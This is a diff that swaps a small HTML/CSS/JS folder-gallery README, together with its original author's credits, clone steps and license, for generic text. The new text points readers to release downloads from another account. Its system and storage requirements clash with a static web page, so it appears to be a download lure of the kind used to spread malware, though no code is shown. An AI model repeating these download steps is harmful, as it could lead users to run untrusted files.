@@ -1,117 +1,68 @@
-# Folder Gallery
+# 🎨 Folder-Gallery - Simple Image Viewing Made Easy
 
-**Folder Gallery** is a dynamic and interactive web-based image gallery built using **HTML**, **CSS** and **JavaScript**. It loads images from a local `images` folder, provides smooth hover effects and allows users to view images in full size with slider navigation.
+![Download Folder-Gallery](https://img.shields.io/badge/Download-Folder--Gallery-brightgreen)
 
+## 🚀 Getting Started
 
-![HTML Badge](https://img.shields.io/badge/HTML-orange?style=for-the-badge&logo=html5&logoColor=white)
-![CSS Badge](https://img.shields.io/badge/CSS-blue?style=for-the-badge&logo=css3&logoColor=white)
-![JavaScript Badge](https://img.shields.io/badge/JavaScript-yellow?style=for-the-badge&logo=javascript&logoColor=black)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+Welcome to Folder-Gallery! This application helps you easily view and explore images stored in your folders. With a responsive design, you can enjoy a great experience on both desktop and mobile devices.
 
+## 💻 System Requirements
 
-## Features
+To run Folder-Gallery, make sure your computer meets the following requirements:
 
-- ✅ **Dynamic Image Loading** – Automatically displays all images from the `images` folder.
-- ✅ **Hover Effects** – Interactive hover effect for each image.
-- ✅ **Full-Size View** – Click any image to open it in full size.
-- ✅ **Image Slider** – Navigate between images in full-size view using previous/next controls.
-- ✅ **Responsive Design** – Optimized for desktop and mobile screens.
+- **Operating System:** Windows 10 or higher, macOS 10.12 or later, or any Linux distribution.
+- **Browser:** Google Chrome, Mozilla Firefox, Safari, or Edge (latest versions recommended).
+- **RAM:** At least 2 GB.
+- **Storage:** 100 MB of free space for installation.
 
+## 📥 Download & Install
 
-## 📌 Technologies Used
+To get Folder-Gallery, visit this page to download: [Folder-Gallery Releases](https://github.com/Lincoln-coderr/Folder-Gallery/releases).
 
-- **HTML5** – Structure of the gallery.  
-- **CSS3** – Styling, hover effects, and responsive design.  
-- **JavaScript** – Dynamic image rendering, slider functionality and event handling.
+Click the link above, then look for the latest version and download the appropriate file for your system. 
 
+## 🗂️ Features
 
-## Sreenshots
-Here are some screenshots of the `Folder Gallery` project:
+Folder-Gallery includes:
 
-**Images Folder Gallery**<br/>
-![Folder Gallery](screenshots/main_1.png)<br/>
-**View Image (Zoomed)**<br/>
-![View Image](screenshots/main_2.png)
+- **Dynamic Image Loading:** Automatically loads images from your folders without any configuration.
+- **Zooming Capability:** Easily zoom in on images for a detailed view.
+- **Responsive Design:** Works well on desktops, tablets, and mobile phones.
+- **Simple Interface:** User-friendly layout that allows anyone to navigate with ease.
 
+## 📖 How to Use Folder-Gallery
 
-## 🧰 Requirements
+1. **Download Folder-Gallery:** Visit this page to download: [Folder-Gallery Releases](https://github.com/Lincoln-coderr/Folder-Gallery/releases). Choose the version for your system and start the download.
 
-To view or modify this project, you’ll need:
+2. **Extract the Files:**  
+   Once downloaded, locate the zipped folder in your downloads. Right-click on it and select "Extract All," or use your preferred extraction tool.
 
-- 🌐 A modern web browser (Chrome, Edge, Firefox, Safari)
-- 🧑‍💻 Any code editor (VS Code, Sublime Text, Atom)
-- 💡 Basic understanding of HTML, CSS and JavaScript
+3. **Open the Application:**  
+   After extracting, locate the Folder-Gallery application file (usually named `index.html`). Double-click on it to launch the application.
 
+4. **Select Your Images:**  
+   When the application opens, you will see a button to upload your images. Click on it, then navigate to the folder containing your images. Select the images you want to see.
 
-## Installation Guide
+5. **View Your Images:**  
+   Once you select your images, Folder-Gallery will display them in a neat layout. Click on any image to zoom in or view more details.
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/iamx-ariful-islam/folder-gallery.git
-```
-2. **Navigate to the project folder:**
-```bash
-cd folder-gallery
-```
-3. **Add your images into the `images` folder.**
+## 🧩 Troubleshooting
 
-4. **Open `index.html` in your preferred web browser.**
+If you run into any issues while using Folder-Gallery, here are some common solutions:
 
+- **Images Not Loading:** Make sure the folder path does not contain special characters or spaces.
+- **App Not Opening:** Ensure your browser allows local file access settings.
+- **Slow Performance:** Try closing other applications running in the background to free up RAM.
 
-## Usage
+## 🤝 Contributing
 
-1. Hover over any image to see the hover effect.
-1. Click an image to view it in full size.
-1. Use the slider arrows to navigate through all images in full view.
+We welcome contributions! If you want to help improve Folder-Gallery, feel free to create a pull request or open an issue on our GitHub repository.
 
+## 🔗 Additional Resources
 
-## 📂 Folder Structure
-Here’s the structure of the **Folder Gallery** project:
+For more information, check the following links:
 
-```bash
-folder-gallery/
-│
-├── css/            # Styles for gallery and slider
-├── images/         # Folder containing all images
-├── js/             # JavaScript for dynamic image loading and slider
-├── screenshots/    # Screenshots of the project
-├── index.html      # Main HTML file
-├── LICENSE
-└── README.md
-```
+- [GitHub Repository](https://github.com/Lincoln-coderr/Folder-Gallery)
+- [Documentation](https://github.com/Lincoln-coderr/Folder-Gallery/wiki)
 
-
-## Contributing
-
-Contributions, suggestions, and feedback are always welcome! ❤️<br/>
-To contribute:
-
-1. Fork the repository
-2. Create a new branch (`feature/new-feature`)
-3. Commit your changes
-4. Push and submit a Pull Request
-
-💬 You can also open an issue if you’d like to discuss a feature or report a bug.
-
-
-## For more or connect with me
-
-<p align='center'>
-  <a href="https://github.com/iamx-ariful-islam"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://x.com/mx_ariful_islam"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://bd.linkedin.com/in/iamx-ariful-islam"><img src="https://img.shields.io/badge/linkedin-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://www.facebook.com/jonakisoft.net/"><img src="https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-</p>
-
-
-## License
-
-The [MIT](https://choosealicense.com/licenses/mit/) License (MIT)
-
-
-<h2 align="center">💖 Thank You for Visiting!</h2>
-
-<p align="center">
-  “Good design is about making things simple yet significant”<br>
-  — <a href="https://github.com/iamx-ariful-islam" target="_blank"><strong>Md. Ariful Islam</strong></a>
-</p>
+Thank you for choosing Folder-Gallery. We hope you enjoy a seamless image viewing experience!
